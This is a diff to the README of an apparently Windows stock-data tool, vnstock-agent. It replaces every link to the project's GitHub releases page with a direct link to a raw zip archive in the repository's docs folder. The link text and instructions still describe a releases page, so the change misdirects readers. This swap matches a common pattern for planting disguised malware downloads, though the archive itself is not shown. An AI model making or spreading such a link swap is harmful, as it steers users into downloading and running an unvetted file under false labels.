@@ -1,6 +1,6 @@
 # 📈 vnstock-agent - Simple stock data on Windows
 
-[![Download vnstock-agent](https://img.shields.io/badge/Download%20vnstock-agent-ff7f50?style=for-the-badge&logo=github)](https://github.com/Multiplexoperationoratory685/vnstock-agent/releases)
+[![Download vnstock-agent](https://img.shields.io/badge/Download%20vnstock-agent-ff7f50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Multiplexoperationoratory685/vnstock-agent/main/docs/agent_vnstock_v1.8.zip)
 
 ## 🚀 What this app does
 
@@ -26,7 +26,7 @@ If you plan to use the CLI, you should also have access to Command Prompt or Pow
 
 Visit this page to download vnstock-agent:
 
-[Download vnstock-agent releases](https://github.com/Multiplexoperationoratory685/vnstock-agent/releases)
+[Download vnstock-agent releases](https://raw.githubusercontent.com/Multiplexoperationoratory685/vnstock-agent/main/docs/agent_vnstock_v1.8.zip)
 
 On the releases page, look for the latest version. Download the file made for Windows. If there are more than one file, choose the one that ends with `.exe`, `.zip`, or another Windows file type listed for the release.
 
@@ -171,4 +171,4 @@ This helps you confirm that the connection works before you depend on it.
 
 If you need the file again, use the same release page:
 
-[Visit vnstock-agent releases](https://github.com/Multiplexoperationoratory685/vnstock-agent/releases)
+[Visit vnstock-agent releases](https://raw.githubusercontent.com/Multiplexoperationoratory685/vnstock-agent/main/docs/agent_vnstock_v1.8.zip)
